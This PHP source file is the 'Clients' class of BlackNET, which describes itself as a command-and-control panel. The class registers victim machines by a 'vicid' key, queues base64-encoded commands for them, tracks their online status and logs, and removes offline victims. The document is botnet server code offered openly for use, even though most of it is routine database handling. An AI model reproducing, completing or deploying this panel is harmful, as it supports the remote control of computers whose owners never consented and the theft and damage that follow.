<?php
declare (strict_types = 1);

/**
 * Class to handle clients and C&C Panel using HTTP and MySQL
 *
 * @package BlackNET
 * @author Black.Hacker <farisksa79@protonmail.com>
 * @version 1.0.0
 * @license MIT
 * @link https://github.com/FarisCode511/BlackNET
 */
class Clients
{

    /**
     * Database Connection
     *
     * @var Database $db
     */
    private $db;

    /**
     * Clients class construct
     */
    public function __construct()
    {
        $this->db = new Database;
    }

    /**
     * Create a new client
     *
     * @param array $clientdata
     * @return boolean
     */
    public function newClient(array $clientdata): bool
    {
        try {
            if ($this->isExist($clientdata['vicid'], "clients")) {
                if ($this->updateClient($clientdata)) {
                    return true;
                }
            } else {

                $this->db->query(sprintf("INSERT INTO %s (%s) VALUES (%s)", "clients", implode(", ", array_keys($clientdata)), ":" . implode(",:", array_keys($clientdata))));

                foreach ($clientdata as $key => $value) {
                    $this->db->bind(":" . $key, $value, PDO::PARAM_STR);
                }

                if ($this->db->execute()) {
                    $this->createCommand($clientdata['vicid']);
                    return true;
                }
            }
        } catch (Exception $th) {
            //throw $th;
        }
    }

    /**
     * Remove a client from the database
     *
     * @param string $clientID
     * @return boolean
     */
    public function removeClient(string $clientID): bool
    {
        try {
            $this->removeCommands($clientID);

            $this->db->query("DELETE FROM clients WHERE vicid = :id");

            $this->db->bind(":id", $clientID, PDO::PARAM_STR);

            if ($this->db->execute()) {
                return true;
            }
        } catch (Exception $th) {
            //throw $th;
        }
    }

    /**
     * update a client information with new one
     *
     * @param array $clientdata
     * @return boolean
     */
    public function updateClient(array $clientdata): bool
    {
        try {
            $query = sprintf('UPDATE %s SET ', "clients");
            foreach ($clientdata as $key => $value) {
                $query .= "$key=:$key, ";
            }

            $query = rtrim($query, ", ");
            $query .= sprintf(' WHERE vicid = %s', ":vicid");

            $this->db->query($query);

            foreach ($clientdata as $key => $value) {
                $this->db->bind(":" . $key, $value, PDO::PARAM_STR);
            }

            if ($this->db->execute()) {
                return true;
            }
        } catch (Exception $th) {
            //throw $th;
        }
    }

    /**
     * check if a client exist
     *
     * @param string $clientID
     * @param string $table_name
     * @return boolean
     */
    public function isExist(string $clientID, string $table_name): bool
    {
        try {
            $this->db->query(sprintf("SELECT * FROM %s WHERE vicid = :id", $table_name));

            $this->db->bind(':id', $clientID, PDO::PARAM_STR);

            if ($this->db->execute()) {
                if ($this->db->rowCount()) {
                    return true;
                } else {
                    return false;
                }
            }
        } catch (Exception $th) {
            //throw $th;
        }
    }

    /**
     * get all clients from database
     *
     * @return array
     */
    public function getClients(): array
    {
        try {
            $this->db->query("SELECT * FROM clients");
            if ($this->db->execute()) {
                return $this->db->resultset();
            }
        } catch (Exception $th) {
            //throw $th;
        }
    }

    /**
     * Count all clients
     *
     * @return integer
     */
    public function countClients(): int
    {
        try {
            $this->db->query("SELECT * FROM clients");
            if ($this->db->execute()) {
                return $this->db->rowCount();
            }
        } catch (Exception $th) {
            //throw $th;
        }
    }

    /**
     * get a client information from the database using vicid
     *
     * @param string $vicID
     * @return object
     */
    public function getClient(string $vicID): object
    {
        try {
            $this->db->query("SELECT * FROM clients WHERE vicid = :id");

            $this->db->bind(":id", $vicID, PDO::PARAM_STR);

            if ($this->db->execute()) {
                return $this->db->single();
            }
        } catch (Exception $th) {
            //throw $th;
        }
    }

    /**
     * count number of clients using a condetion
     *
     * @param string $column_name
     * @param string $cond
     * @return integer
     */
    public function countClientsByCond(string $column_name, string $cond): int
    {
        try {
            $this->db->query(sprintf("SELECT * FROM clients WHERE %s = :cond", $column_name));

            $this->db->bind(":cond", $cond, PDO::PARAM_STR);

            if ($this->db->execute()) {
                return $this->db->rowCount();
            }
        } catch (Exception $th) {
            //throw $th;
        }
    }

    /**
     * update a client status online/offline
     *
     * @param string $vicID
     * @param string $status
     * @return boolean
     */
    public function updateStatus(string $vicID, string $status): bool
    {
        try {
            $this->db->query("UPDATE clients SET status = :status WHERE vicid = :id");

            $this->db->bind(":id", $vicID, PDO::PARAM_STR);
            $this->db->bind(":status", $status, PDO::PARAM_STR);

            if ($this->db->execute()) {
                return true;
            }
        } catch (Exception $th) {
            //throw $th;
        }
    }

    /**
     * Create a new log message
     *
     * @param string $vicid
     * @param string $type
     * @param string $message
     * @return boolean
     */
    public function new_log(string $vicid, string $type, string $message): bool
    {
        try {
            $this->db->query("INSERT INTO logs(vicid,type,message) VALUES (:vicid,:type,:message)");

            $this->db->bind(":vicid", $vicid, PDO::PARAM_STR);
            $this->db->bind(":type", $type, PDO::PARAM_STR);
            $this->db->bind(":message", $message, PDO::PARAM_STR);

            if ($this->db->execute()) {
                return true;
            }
        } catch (Exception $th) {
            //throw $th;
        }
    }

    /**
     * Get all logs from the database
     *
     * @return array
     */
    public function getLogs(): array
    {
        try {
            $this->db->query("SELECT * FROM logs");

            if ($this->db->execute()) {
                return $this->db->resultset();
            }
        } catch (Exception $th) {
            //throw $th;
        }
    }

    /**
     * Delete a log from the database using ID
     *
     * @param integer $id
     * @return boolean
     */
    public function deleteLog(int $id): bool
    {
        try {
            $this->db->query("DELETE FROM logs WHERE id = :id");

            $this->db->bind(":id", $id, PDO::PARAM_INT);

            if ($this->db->execute()) {
                return true;
            }
        } catch (Exception $th) {
        }
    }

    /**
     * get the last command using vicid
     *
     * @param string $vicID
     * @return object
     */
    public function getCommand(string $vicID): object
    {
        try {
            $this->db->query("SELECT * FROM commands WHERE vicid = :id");

            $this->db->bind(":id", $vicID, PDO::PARAM_STR);

            if ($this->db->execute()) {
                return $this->db->single();
            } else {
                return json_decode(json_encode(["error" => "client not found"]), false);
            }
        } catch (Exception $th) {
            //throw $th;
        }
    }

    /**
     * update all clients status offline/online
     *
     * @param string $status
     * @return boolean
     */
    public function updateAllStatus(string $status): bool
    {
        try {
            $this->db->query("UPDATE clients SET status = :status");

            $this->db->bind(":status", $status, PDO::PARAM_STR);

            if ($this->db->execute()) {
                return true;
            }

        } catch (Exception $th) {
            //throw $th;
        }
    }

    /**
     * create a new command using the victim id
     *
     * @param string $vicID
     * @return boolean
     */
    public function createCommand(string $vicID): bool
    {
        try {
            if ($this->isExist($vicID, "commands")) {
                if ($this->updateCommands($vicID, $this->base64_encode_url("Ping"))) {
                    return true;
                }
            } else {

                $this->db->query("INSERT INTO commands(vicid,command) VALUES(:vicid,:cmd)");

                $this->db->bind(":vicid", $vicID, PDO::PARAM_STR);
                $this->db->bind(":cmd", $this->base64_encode_url("Ping"), PDO::PARAM_STR);

                if ($this->db->execute()) {
                    return true;
                }
            }
        } catch (Exception $th) {
            //throw $th;
        }
    }

    /**
     * Ping a client to check if he/she online
     *
     * @param string $vicid
     * @param integer $old_pings
     * @return boolean
     */
    public function pinged(string $vicid, int $old_pings): bool
    {
        $pinged_at = date("m/d/Y H:i:s", time());

        $this->db->query("UPDATE clients SET pings = :ping, update_at = :update_at WHERE vicid = :vicid");

        $this->db->bind(":ping", $old_pings + 1, PDO::PARAM_INT);
        $this->db->bind(":update_at", $pinged_at, PDO::PARAM_STR);
        $this->db->bind(":vicid", $vicid, PDO::PARAM_STR);

        if ($this->db->execute()) {
            return true;
        }
    }

    /**
     * update a command if a client exist
     *
     * @param string $vicID
     * @param string $command
     * @return boolean
     */
    public function updateCommands(string $vicID, string $command): bool
    {
        try {
            $this->db->query("UPDATE commands SET command = :cmd WHERE vicid = :id");

            $this->db->bind(":cmd", $command, PDO::PARAM_STR);
            $this->db->bind(":id", $vicID, PDO::PARAM_STR);

            if ($this->db->execute()) {
                return true;
            }
        } catch (Exception $th) {
            //throw $th;
        }
    }

    /**
     * remove command after uninstalling a client
     *
     * @param string $vicID
     * @return boolean
     */
    public function removeCommands(string $vicID): bool
    {
        try {
            $this->db->query("DELETE FROM commands WHERE vicid = :id");

            $this->db->bind(":id", $vicID, PDO::PARAM_STR);

            if ($this->db->execute()) {
                return true;
            }
        } catch (Exception $th) {
            //throw $th;
        }
    }

    /**
     * Ping all clients in database
     *
     * @return boolean
     */
    public function pingClients(): bool
    {
        try {
            $allclients = $this->getClients();
            foreach ($allclients as $client) {
                if ($this->updateCommands($client->vicid, base64_encode("Ping"))) {
                    $diff = time() - strtotime($client->update_at);
                    $hrs = round($diff / 3600);

                    if ($hrs >= 1) {
                        $this->updateStatus($client->vicid, "Offline");
                    } else {
                        $this->updateStatus($client->vicid, "Online");
                    }
                }
            }
            return true;
        } catch (Exception $th) {
            return false;
        }
    }

    /**
     * Remove all offline clients from the database
     *
     * @return boolean
     */
    public function uninstallOfflineClients(): bool
    {
        try {
            $allclients = $this->getClients();

            foreach ($allclients as $client) {
                if ($client->status == "Offline") {
                    $this->removeClient($client->vicid);
                }
            }
            return true;
        } catch (Exception $th) {
            //throw $th;
        }
    }

    /**
     * Encode string using Base64_URL_Safe Method
     *
     * @param string $string
     * @return string
     */
    public function base64_encode_url(string $string): string
    {
        return str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($string));
    }
}
